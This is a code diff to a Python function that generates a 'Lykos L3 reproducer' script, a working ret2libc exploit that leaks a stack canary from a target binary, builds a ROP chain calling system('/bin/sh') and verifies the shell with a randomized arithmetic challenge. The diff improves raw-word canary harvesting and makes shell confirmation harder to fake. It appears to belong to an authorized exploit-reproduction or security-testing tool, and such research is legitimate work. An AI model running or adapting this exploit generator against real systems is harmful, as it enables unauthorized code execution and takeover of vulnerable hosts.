@@ -299,7 +299,7 @@ def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, 
     return (
         "#!/usr/bin/env python3\n"
         "# Lykos L3 reproducer: ret2libc past a stack canary. Authorized-use only.\n"
-        "import os, re, select, struct, subprocess, sys, time\n"
+        "import os, random, re, select, struct, subprocess, sys, time\n"
         "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
         f"CANARY_OFF={canary_offset}; RET_OFF={ret_offset}\n"
         f"TRIGGER={canary_trigger!r}; FEED={feed!r}\n"
@@ -333,6 +333,9 @@ def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, 
         "    p.stdin.write(TRIGGER); p.stdin.flush()\n"
         "    dump=read_until(p, time.time()+3)\n"
         "    vals=[int(m.group(0),16) for m in re.finditer(REGEX.encode(),dump)]\n"
+        # A buffer OVER-READ leaks the canary as a RAW little-endian word (no hex text), so harvest
+        # 8-byte words too; find_canary picks the high-entropy, low-byte-0 one that is not a pointer.
+        "    vals += [int.from_bytes(dump[i:i+8],'little') for i in range(max(0,len(dump)-7))]\n"
         "    canary = vals[IDX] if (IDX is not None and -len(vals)<=IDX<len(vals)) else find_canary(vals)\n"
         "    if canary is None: p.kill(); continue\n"
         "    pre=prefix(canary)\n"
@@ -343,16 +346,20 @@ def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, 
         "    if base<=0 or base&0xFFF: p.kill(); continue\n"
         "    p.stdin.write(FEED); p.stdin.flush(); read_until(p, time.time()+0.4)\n"
         "    s2=bytearray(pre)+(q(align) if align else b'')+q(POP_RDI)+q(base+BINSH_OFF)+q(base+SYSTEM_OFF)\n"
+        "    ca, cb = random.randint(1000, 9999), random.randint(1000, 9999)\n"
+        # A real shell EVALUATES $((ca*cb)); a target echoing stdin prints the literal form, so the
+        # check is forgery-proof -- unlike the old fixed `echo PWNED-LYKOS`, which an echo reflected.
         "    try:\n"
         "        p.stdin.write(bytes(s2)); p.stdin.flush(); time.sleep(0.3)\n"
-        "        p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
+        "        p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (ca, cb)); p.stdin.flush()\n"
         "    except (BrokenPipeError, OSError): p.kill(); continue\n"
         "    out=read_until(p, time.time()+6, quiet=1.5)\n"
-        "    if b'PWNED-LYKOS' in out:\n"
-        "        print('shell (canary %#x, libc base %#x):'%(canary,base)); "
-        "print(out.decode('latin-1','ignore')); sys.exit(0)\n"
+        "    if (b'LYKOS_SHELL_%d' % (ca*cb)) in out:\n"
+        "        sys.stdout.write(out.decode('latin-1','ignore'))\n"
+        "        print('\\n[+] canary %#x bypassed, libc base %#x, shell evaluated the challenge'%(canary,base)); "
+        "sys.exit(0)\n"
         "    p.kill()\n"
-        "sys.stderr.write('canary ret2libc did not confirm\\n'); sys.exit(1)\n"
+        "print('[-] canary ret2libc did not confirm'); sys.exit(1)\n"
     ).encode()
 
 
